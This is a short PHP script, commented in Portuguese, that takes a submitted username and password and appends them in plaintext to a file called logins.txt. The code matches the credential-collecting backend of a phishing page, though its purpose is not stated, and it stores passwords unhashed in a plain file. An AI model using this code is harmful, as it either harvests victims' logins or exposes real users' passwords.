<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Concatena o usuário e senha em uma única string
    $login_data = "Usuário: " . $username . ", Senha: " . $password . PHP_EOL;

    // Abre o arquivo em modo de escrita (append) e salva os dados
    file_put_contents('logins.txt', $login_data, FILE_APPEND);

    echo "Login salvo com sucesso!";
}
?>
